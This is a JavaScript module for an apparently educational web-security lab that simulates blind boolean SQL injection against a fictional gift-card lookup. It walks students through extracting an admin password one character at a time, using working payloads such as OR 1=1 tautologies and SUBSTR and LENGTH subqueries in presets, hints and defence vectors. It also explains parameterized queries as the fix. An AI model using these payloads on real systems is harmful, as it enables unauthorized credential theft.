/* ════════════════════════════════════════════════════════════════════
   STRATA · Blind (boolean-based) SQL injection
   A harder companion to the built-in `sqli` lab: same class, no readout.
   The response is one bit — "card found" or "no such card" — and the
   student reads a password out of it one character at a time.

   Authored against docs/AI-LAB-BRIEF.md. The engine is a real tokenizer +
   recursive-descent boolean evaluator over a two-table in-memory database:
   free-typed conditions are actually parsed and answered, not matched
   against a list of accepted payloads.
   ════════════════════════════════════════════════════════════════════ */

const BS_CARDS = [
  { code:"GIFT-4417", balance:"25.00" },
  { code:"GIFT-9032", balance:"140.00" },
  { code:"GIFT-1180", balance:"5.00" }
];
const BS_USERS = [
  { email:"admin@aperture.lab", password:"s3cr3t" },
  { email:"you@aperture.lab",   password:"hunter2" }
];
const BS_TABLES = { cards: BS_CARDS, users: BS_USERS };

/* ── a small, honest SQL boolean engine ──────────────────────────────
   Supports: AND / OR / NOT, parentheses, = != <> < <= > >=, string and
   number literals, LENGTH / SUBSTR / SUBSTRING / ASCII / UPPER / LOWER,
   and scalar subqueries (SELECT col FROM t [WHERE col = expr]) plus
   SELECT COUNT(*). Anything else is a syntax error, exactly as the
   database would say. */
function bsErr(msg){ const e = new Error(msg); e.sql = true; return e; }

function bsTokenize(src){
  const T = [];
  let i = 0;
  while (i < src.length){
    const c = src[i];
    if (/\s/.test(c)){ i++; continue; }
    if (c === "'"){                       // '' is an escaped quote, not a terminator
      let j = i + 1, v = "";
      for (;;){
        if (j >= src.length) throw bsErr("unterminated string literal");
        if (src[j] === "'"){
          if (src[j + 1] === "'"){ v += "'"; j += 2; continue; }
          j++; break;
        }
        v += src[j++];
      }
      T.push({ k:"str", v }); i = j; continue;
    }
    if (/[0-9]/.test(c)){
      let j = i;
      while (j < src.length && /[0-9.]/.test(src[j])) j++;
      const n = Number(src.slice(i, j));
      if (!isFinite(n)) throw bsErr("malformed number");
      T.push({ k:"num", v:n }); i = j; continue;
    }
    if (/[a-z_]/i.test(c)){
      let j = i;
      while (j < src.length && /[a-z0-9_.]/i.test(src[j])) j++;
      T.push({ k:"id", v:src.slice(i, j) }); i = j; continue;
    }
    const two = src.slice(i, i + 2);
    if (two === "<=" || two === ">=" || two === "<>" || two === "!="){ T.push({ k:"op", v:two }); i += 2; continue; }
    if ("=<>(),*".includes(c)){ T.push({ k:"op", v:c }); i++; continue; }
    throw bsErr(`unexpected character "${c}"`);
  }
  return T;
}

/* returns { value, probe } — probe records WHAT the condition asked about,
   which is how the objectives know recon from measurement from a read */
function bsEval(src){
  const T = bsTokenize(src);
  const probe = { users:false, substr:false, length:false, count:false, password:false };
  let p = 0;

  const at = () => T[p];
  const isId = w => { const t = T[p]; return !!t && t.k === "id" && t.v.toUpperCase() === w; };
  const isOp = v => { const t = T[p]; return !!t && t.k === "op" && t.v === v; };
  const takeId = w => { if (!isId(w)) throw bsErr(`expected ${w}`); return T[p++].v; };
  const takeOp = v => { if (!isOp(v)) throw bsErr(`expected "${v}"`); return T[p++].v; };

  const num = v => (typeof v === "number" ? v : (String(v).trim() !== "" && isFinite(Number(v)) ? Number(v) : null));
  const compare = (l, r, op) => {
    const ln = num(l), rn = num(r);
    const both = ln !== null && rn !== null;
    const a = both ? ln : String(l == null ? "" : l);
    const b = both ? rn : String(r == null ? "" : r);
    switch (op){
      case "=":  return a === b;
      case "!=":
      case "<>": return a !== b;
      case "<":  return a < b;
      case "<=": return a <= b;
      case ">":  return a > b;
      case ">=": return a >= b;
      default:   throw bsErr(`unknown operator ${op}`);
    }
  };

  /* SELECT col|COUNT(*) FROM table [WHERE col <op> expr] — scalar result */
  function subselect(){
    takeId("SELECT");
    let col = null, counting = false;
    if (isId("COUNT")){ p++; takeOp("("); takeOp("*"); takeOp(")"); counting = true; probe.count = true; }
    else {
      const t = at();
      if (!t || t.k !== "id") throw bsErr("expected a column name after SELECT");
      col = t.v.split(".").pop().toLowerCase(); p++;
    }
    takeId("FROM");
    const tn = at();
    if (!tn || tn.k !== "id") throw bsErr("expected a table name after FROM");
    const tname = tn.v.toLowerCase(); p++;
    const rows = BS_TABLES[tname];
    if (!rows) throw bsErr(`no such table: ${tname}`);
    if (tname === "users") probe.users = true;
    if (col === "password") probe.password = true;

    let sel = rows.slice();
    if (isId("WHERE")){
      p++;
      const wt = at();
      if (!wt || wt.k !== "id") throw bsErr("expected a column in WHERE");
      const wcol = wt.v.split(".").pop().toLowerCase(); p++;
      const wop = at();
      if (!wop || wop.k !== "op" || !["=", "!=", "<>", "<", "<=", ">", ">="].includes(wop.v)) throw bsErr("expected a comparison in WHERE");
      p++;
      const wval = atom();
      sel = sel.filter(r => compare(r[wcol], wval, wop.v));
    }
    if (isId("LIMIT")){ p++; const n = at(); if (!n || n.k !== "num") throw bsErr("expected a number after LIMIT"); p++; sel = sel.slice(0, n.v); }
    if (counting) return sel.length;
    const row = sel[0];
    if (!row) return null;
    if (!(col in row)) throw bsErr(`no such column: ${col}`);
    return row[col];
  }

  function call(name){
    takeOp("(");
    const args = [];
    if (!isOp(")")){
      args.push(expr());
      while (isOp(",")){ p++; args.push(expr()); }
    }
    takeOp(")");
    const s = v => String(v == null ? "" : v);
    switch (name){
      case "LENGTH":
        probe.length = true;
        return s(args[0]).length;
      case "SUBSTR":
      case "SUBSTRING": {
        probe.substr = true;
        const start = num(args[1]);
        const len = args.length > 2 ? num(args[2]) : null;
        if (start === null) throw bsErr("SUBSTR needs a numeric start");
        const from = start > 0 ? start - 1 : 0;          // SQL is 1-indexed
        return len === null ? s(args[0]).slice(from) : s(args[0]).substr(from, len);
      }
      case "ASCII":
        return s(args[0]).charCodeAt(0) || 0;
      case "UPPER": return s(args[0]).toUpperCase();
      case "LOWER": return s(args[0]).toLowerCase();
      default: throw bsErr(`unknown function ${name}()`);
    }
  }

  function atom(){
    const t = at();
    if (!t) throw bsErr("unexpected end of condition");
    if (t.k === "str"){ p++; return t.v; }
    if (t.k === "num"){ p++; return t.v; }
    if (isOp("(")){
      p++;
      const v = isId("SELECT") ? subselect() : expr();
      takeOp(")");
      return v;
    }
    if (t.k === "id"){
      const up = t.v.toUpperCase();
      if (["LENGTH", "SUBSTR", "SUBSTRING", "ASCII", "UPPER", "LOWER"].includes(up)){ p++; return call(up); }
      if (up === "NULL"){ p++; return null; }
      if (up === "TRUE"){ p++; return 1; }
      if (up === "FALSE"){ p++; return 0; }
      throw bsErr(`unknown identifier "${t.v}" — the cards table is not in scope here`);
    }
    throw bsErr(`unexpected token "${t.v}"`);
  }

  function cmp(){
    if (isId("NOT")){ p++; return !truthy(cmp()); }
    const left = atom();
    const t = at();
    if (t && t.k === "op" && ["=", "!=", "<>", "<", "<=", ">", ">="].includes(t.v)){
      p++;
      const right = atom();
      return compare(left, right, t.v);
    }
    return left;
  }

  const truthy = v => (typeof v === "boolean" ? v : (typeof v === "number" ? v !== 0 : !!v && v !== "0"));

  function and(){
    let v = cmp();
    while (isId("AND")){ p++; const r = cmp(); v = truthy(v) && truthy(r); }
    return v;
  }
  function expr(){
    let v = and();
    while (isId("OR")){ p++; const r = and(); v = truthy(v) || truthy(r); }
    return v;
  }

  const value = expr();
  if (p < T.length) throw bsErr(`trailing tokens after the condition ("${T[p].v}")`);
  return { value: truthy(value), probe };
}

/* the developer's literal ends at the first quote the student did NOT escape */
function bsBreakAt(s){
  for (let i = 0; i < s.length; i++){
    if (s[i] !== "'") continue;
    if (s[i + 1] === "'"){ i++; continue; }
    return i;
  }
  return -1;
}
function bsOddQuotes(s){
  let n = 0;
  for (let i = 0; i < s.length; i++){
    if (s[i] !== "'") continue;
    if (s[i + 1] === "'"){ i++; continue; }
    n++;
  }
  return n % 2 === 1;
}

STRATA.registerLab({
  id: "blind-sqli",
  code: "A03",
  cat: "Injection",
  title: "Blind SQL injection in a gift-card lookup",
  difficulty: "Practitioner",
  severity: ["CRIT", "9.8"],
  goal: "The page never shows you a row — only whether one existed. Read the admin's password out of that single bit.",

  layers: [
    { code:"L0", title:"Surface",  meta:"balance checker" },
    { code:"L1", title:"Client",   meta:"check.js" },
    { code:"L2", title:"Request",  meta:"GET /gift" },
    { code:"L3", title:"Edge",     meta:"no filter" },
    { code:"L4", title:"Server",   meta:"app.py" },
    { code:"L5", title:"Oracle",   meta:"one bit of truth" },
    { code:"L6", title:"Data",     meta:"cards · users" }
  ],
  boundary: 4,
  boundaryLabel: "Query boundary",
  boundaryTone: "breach",

  defaultQ: "GIFT-4417",
  presets: [
    { q:"GIFT-4417", label:"A real card" },
    { q:"GIFT-0000", label:"No such card" },
    { q:"' OR 1=1-- ", label:"Is it injectable?" },
    { q:"' OR LENGTH((SELECT password FROM users WHERE email='admin@aperture.lab'))=6-- ", label:"Measure the password" },
    { q:"' OR SUBSTR((SELECT password FROM users WHERE email='admin@aperture.lab'),1,1)='s'-- ", label:"Read one character", spoiler:true }
  ],
  consoleLabel: "Gift card codes",

  analyze(q){
    const typed = String(q);
    const code = typed;
    const bi = bsBreakAt(typed);
    const broke = bi >= 0;
    const prefix = broke ? typed.slice(0, bi) : typed;
    const exact = BS_CARDS.filter(c => c.code === prefix);

    const a = {
      typed, code, broke, prefix,
      op: null, cond: "", truth: null, err: null,
      probe: { users:false, substr:false, length:false, count:false, password:false },
      rows: broke ? [] : BS_CARDS.filter(c => c.code === typed),
      commented: false
    };
    a.sql = `SELECT balance FROM cards WHERE code = '${typed}'`;

    if (!broke){
      a.found = a.rows.length > 0;
      a.read = false; a.measured = false; a.oracle = false;
      return a;
    }

    const tail = typed.slice(bi + 1);
    const cm = tail.search(/--|#/);
    a.commented = cm >= 0;
    // without a comment the server's own closing quote is still coming: it
    // only lands safely if the injected tail left a literal open for it
    const cond = a.commented ? tail.slice(0, cm) : tail + "'";
    if (!a.commented && !bsOddQuotes(tail)){
      a.err = "unterminated string literal — the server's closing quote has nothing to close";
      a.found = false; a.read = false; a.measured = false; a.oracle = false;
      return a;
    }

    const m = /^\s*(OR|AND)\b/i.exec(cond);
    if (!m){
      a.err = `syntax error near "${cond.trim().slice(0, 18) || "'"}" — a condition has to continue the WHERE clause`;
      a.found = false; a.read = false; a.measured = false; a.oracle = false;
      return a;
    }
    a.op = m[1].toUpperCase();
    a.cond = cond.slice(m[0].length);

    try {
      const r = bsEval(a.cond);
      a.truth = r.value;
      a.probe = r.probe;
    } catch (e){
      a.err = e && e.sql ? e.message : "syntax error in the injected condition";
      a.found = false; a.read = false; a.measured = false; a.oracle = false;
      return a;
    }

    a.rows = a.op === "OR" ? (a.truth ? BS_CARDS.slice() : exact)
                           : (a.truth ? exact : []);
    a.found = a.rows.length > 0;
    a.oracle = a.truth === true;
    a.measured = !!(a.truth === true && a.probe.length && a.probe.password);
    a.read = !!(a.truth === true && a.probe.substr && a.probe.password);
    return a;
  },

  layerState(i, a){
    if (a.err) return ["present", "present", "present", "present", "present", "blocked", "absent"][i];
    if (!a.broke) return ["present", "present", "present", "present", "present", "clean", "clean"][i];
    return ["present", "present", "present", "present", "promoted", "boundary",
            a.read ? "promoted" : "present"][i];
  },

  render: {
    0: a => {
      let panel;
      if (a.err)
        panel = `<div class="loginerr">Something went wrong looking that up. Please try again.</div>`;
      else if (a.found)
        panel = `<div class="ownerok">✓ Card found — balance <b>$${esc(a.rows[0].balance)}</b>.</div>`;
      else
        panel = `<div class="s-empty">No such card.</div>`;
      const body = `<h1 class="s-h">Gift card balance</h1>
        <p class="s-sub">enter the code printed on the back</p>
        ${field("Code", a.typed, "Check", "GIFT-0000")}
        <div style="margin-top:12px">${panel}</div>
        ${note("", "Layer 0 · the whole readout",
          "Two states. That is everything this page will ever tell you — and it is enough.")}`;
      return `<div class="applayer">${siteFrame({ path:"/gift", search:false, body })}</div>`;
    },

    1: a => `<pre class="src">${codeLines([
        { t:`<span class="cm">// check.js — no validation, it just asks</span>` },
        { t:`<span class="kw">const</span> code = input.value;` },
        { t:`<span class="kw">const</span> r = <span class="kw">await</span> fetch(<span class="str">'/gift?code='</span> + encodeURIComponent(code));` },
        { t:`show(r.found ? <span class="str">'Card found'</span> : <span class="str">'No such card'</span>);`, hot:true }
      ])}</pre>${note("", "Layer 1 · the client is honest",
        `It forwards your <em>${esc(clip(a.typed, 22)) || "empty"}</em> untouched and renders one of two strings. The client is not the bug; it is the ammeter.`)}`,

    2: a => `<pre class="src">${codeLines([
        { t:`<span class="kw">GET</span> /gift?code=${taint(encodeURIComponent(a.typed))} <span class="kw">HTTP/1.1</span>`, hot:true },
        { t:`Host: shop.aperture.lab` },
        { t:`Accept: application/json` }
      ])}</pre>${note("", "Layer 2 · your bytes, URL-encoded",
        "Percent-encoding is transport, not defence — the server decodes this back to exactly what you typed before it touches the query.")}`,

    3: a => note(a.broke ? "warn" : "", "Layer 3 · nothing in the way",
      a.broke
        ? "No WAF, no allowlist, no length cap. The quote you just sent reaches the origin intact."
        : "An ordinary code goes straight through. There is no filter here to bypass — the flaw is further down."),

    4: a => `<pre class="src">${codeLines([
        { t:`<span class="cm"># app.py — the code is built, not bound</span>` },
        { t:`sql = f<span class="str">"SELECT balance FROM cards WHERE code = '{code}'"</span>`, hot:true },
        { t:`row = db.execute(sql).fetchone()` },
        { t:`<span class="kw">return</span> { <span class="str">"found"</span>: row <span class="kw">is not None</span> }   <span class="cm"># ← the only thing you get back</span>` },
        { t:`` },
        { t:`<span class="cm"># The fix: db.execute("… WHERE code = ?", (code,))</span>` }
      ])}</pre>${note("warn", "Layer 4 · the trust boundary is an f-string",
        `The developer opened a literal with <code style="color:var(--taint)">'</code> and let your bytes finish the sentence. Note what is <em>not</em> returned: no row, no error, no column — just <code>found</code>.`)}`,

    5: a => {
      const built = `<pre class="src">${codeLines([
        { t:`SELECT balance FROM cards WHERE code = '${taintMarkup(a.typed)}'`, hot:true }
      ])}</pre>`;
      if (a.err)
        return built + note("warn", "Layer 5 · the database refused",
          `${esc(a.err)}. The page swallowed it and showed you the friendly error — but you learned something anyway: <b>the quote reached a parser.</b>`);
      if (!a.broke)
        return built + note("", "Layer 5 · your bytes stayed data",
          "Every character sat inside the literal and was compared as a string. This is the baseline you are trying to break.");
      const asked = a.probe.substr ? "a single character of a column"
                  : a.probe.length ? "the length of a column"
                  : a.probe.count  ? "how many rows a table holds"
                  : "a constant";
      return built + note("warn", "Layer 5 · the oracle",
        `Your <code style="color:var(--taint)">${esc(a.op)}</code> attached a condition the developer never wrote, and the database answered it honestly: <b>${a.truth ? "TRUE" : "FALSE"}</b>. You asked about ${asked}. The answer is not printed anywhere — it is the difference between <em>found</em> and <em>not found</em>.`);
    },

    6: a => {
      const hit = new Set(a.rows.map(c => c.code));
      const cards = `<table class="db"><caption>cards</caption><tr><th>code</th><th>balance</th></tr>
        ${BS_CARDS.map(c => `<tr class="${hit.has(c.code) ? "got" : "locked"}"><td>${esc(c.code)}</td><td>$${esc(c.balance)}</td></tr>`).join("")}</table>`;
      const users = `<table class="db"><caption>users${a.probe.users ? " · reached by your condition" : " · never named in this query"}</caption><tr><th>email</th><th>password</th></tr>
        ${BS_USERS.map(u => `<tr class="${a.probe.users ? "got" : "locked"}"><td>${esc(u.email)}</td><td>${esc(u.password)}</td></tr>`).join("")}</table>`;
      let n;
      if (a.err) n = note("warn", "Layer 6 · nothing ran", "The statement never reached the planner, so no rows were considered.");
      else if (a.read) n = note("warn", "Layer 6 · one character, confirmed",
        `No row from <code style="color:var(--ice)">users</code> was ever sent to your browser — and you read one anyway. Repeat with the next offset and the password falls out at roughly <b>one request per character</b>. Rate limiting slows this; it does not stop it.`);
      else if (a.measured) n = note("warn", "Layer 6 · you now know the size",
        "A length is not a secret on its own. It is the thing that tells you how many more questions to ask.");
      else if (a.probe.users) n = note("warn", "Layer 6 · a table you were never shown",
        "Your condition read <code style='color:var(--ice)'>users</code> inside the database. Nothing about that crosses the wire — which is exactly why it is easy to miss in a log.");
      else n = note("", "Layer 6 · as intended", "Only the cards table was consulted.");
      return cards + users + n;
    }
  },

  trace(a){
    const st = this.layerState.bind(this);
    const bit = a.err ? "error" : (a.found ? "found" : "not found");
    return [
      { h:"L0 · Surface", state:st(0, a), b:`<em>${a.typed.length}</em> ${plural(a.typed.length, "byte", "bytes")} captured.` },
      { h:"L1 · Client",  state:st(1, a), b:`Forwarded untouched; renders one of two strings.` },
      { h:"L2 · Request", state:st(2, a), b:`Sent as <em>code</em>. <strong>No validation ran.</strong>` },
      { h:"L3 · Edge",    state:st(3, a), b:`Nothing inspects the query string.` },
      { h:"L4 · Server",  state:st(4, a), b:a.broke ? `Your quote closed the literal. <strong>Trust boundary crossed.</strong>` : `Interpolated into the query as data.` },
      { h:"L5 · Oracle",  state:st(5, a), b:a.err ? `Rejected: ${esc(clip(a.err, 34))}.` : (a.broke ? `Condition answered <em>${a.truth ? "TRUE" : "FALSE"}</em>.` : `Compared as a string.`) },
      { h:"L6 · Data",    state:st(6, a), b:a.err ? `Nothing executed.` : `<em>${a.rows.length}</em> ${plural(a.rows.length, "row", "rows")} matched → <strong>${bit}</strong>.` }
    ];
  },

  verdict(a){
    const sev = a.read ? ["Critical", "bad"] : a.measured || a.probe.users ? ["High", "hot"] : a.broke && !a.err ? ["Medium", "hot"] : a.err ? ["Info", ""] : ["No finding", "good"];
    return [
      ["Response", a.err ? "error" : (a.found ? "card found" : "no such card"), a.found && a.broke ? "hot" : ""],
      ["Bits leaked", a.broke && !a.err ? "1" : "0", a.read ? "bad" : ""],
      ["users read", a.probe.users ? "yes" : "no", a.probe.users ? "bad" : ""],
      ["Severity", sev[0], sev[1]]
    ];
  },

  solved: a => !!a.read,

  challenge: { steps: [
    { id:"oracle", label:"Prove the response is an oracle",
      test: a => !!(a.broke && !a.err && a.truth === true && a.found),
      hints: ["The code you type is compared inside a string the server built. End it early and you are writing SQL.",
              "Make the WHERE clause true for every row, then comment away the rest of the statement.",
              "A tautology after OR, and -- to swallow the server's closing quote."],
      reveal:"' OR 1=1-- " },


    { id:"measure", label:"Measure the admin's password",
      test: a => !!a.measured,
      hints: ["You cannot print a value — but you can ask a yes/no question about it.",
              "A scalar subquery fits anywhere a value fits: (SELECT password FROM users WHERE email='admin@aperture.lab').",
              "Wrap it in LENGTH() and compare against a number until the page says 'found': LENGTH((SELECT password FROM users WHERE email='admin@aperture.lab'))=6."],
      reveal:"' OR LENGTH((SELECT password FROM users WHERE email='admin@aperture.lab'))=6-- " },

    { id:"read", label:"Read a character of the password",
      test: a => !!a.read,
      hints: ["A length tells you how many questions remain; SUBSTR asks each one.",
              "SUBSTR(value, position, 1) isolates a single character — compare it to a guess.",
              "SUBSTR((SELECT password FROM users WHERE email='admin@aperture.lab'),1,1)='s' is true, so the card 'is found'."],
      reveal:"' OR SUBSTR((SELECT password FROM users WHERE email='admin@aperture.lab'),1,1)='s'-- " }
  ]},

  wire: { type:"query", path:"/gift", param:"code" },

  notes:`The lookup returns a single bit — <em>found</em> or <em>not found</em> — and the code is concatenated straight into the query: <code>… WHERE code = '{code}'</code>. That one bit is an oracle. End the literal with a quote, append <code>OR &lt;condition&gt;</code>, and the difference between "card found" and "no such card" answers any yes/no question you can phrase in SQL — including <code>SUBSTR(password,n,1)='x'</code>, one character at a time. No row, no error and no column ever crosses the wire, yet the whole password does. <b>The fix:</b> a parameterized query — <code>db.execute("… WHERE code = ?", (code,))</code> — binds your bytes as data, and the WHERE clause can never grow a condition you wrote.`,

  card: { sig:["a","a","a","a","a","x","x"],
          blurb:"The page tells you one bit — found or not — and you read a password out of it, one character per request." },

  defense: {
    blurb:"The response is a one-bit oracle and the code is built with an f-string. Bind the value and the oracle goes silent — or watch the classic non-fixes fail: hiding errors leaves the found/not-found bit untouched, and throttling only slows an attack that needs a handful of requests.",
    vectors: [
      { q:"' OR SUBSTR((SELECT password FROM users WHERE email='admin@aperture.lab'),1,1)='s'-- ", label:"read char 1" },
      { q:"' OR SUBSTR((SELECT password FROM users WHERE email='admin@aperture.lab'),2,1)='3'-- ", label:"read char 2" }
    ],
    options: [
      { id:"parameterize", label:"Parameterize the query",
        code:'db.execute("… WHERE code = ?", (code,))',
        apply(q){ return bsBreakAt(String(q)) >= 0
          ? { blocked:true, at:4, why:"Bound as a parameter, your quote is just a character in the code string — the WHERE clause stays one comparison. No condition you append is ever parsed, so there is no bit to read." }
          : { blocked:false, at:null, why:"An ordinary code — bound and looked up exactly as before." }; } },
      { id:"generic-error", label:"Return one generic message",
        code:"except: return {'found': False}",
        apply(q){ return bsBreakAt(String(q)) >= 0
          ? { blocked:false, at:5, why:"The oracle was never the error message — it is the difference between 'card found' and 'no such card'. Hiding errors leaves the one bit that leaks the password." }
          : { blocked:false, at:null, why:"A normal lookup — served as before." }; } },
      { id:"ratelimit", label:"Rate-limit the lookup",
        code:"@limiter.limit('10/minute')",
        apply(q){ return bsBreakAt(String(q)) >= 0
          ? { blocked:false, at:2, why:"Blind extraction is about one request per character; a six-character password is a handful of requests. Throttling adds minutes, not safety — the boundary is still missing." }
          : { blocked:false, at:null, why:"Well under the limit — served." }; } }
    ]
  }
});
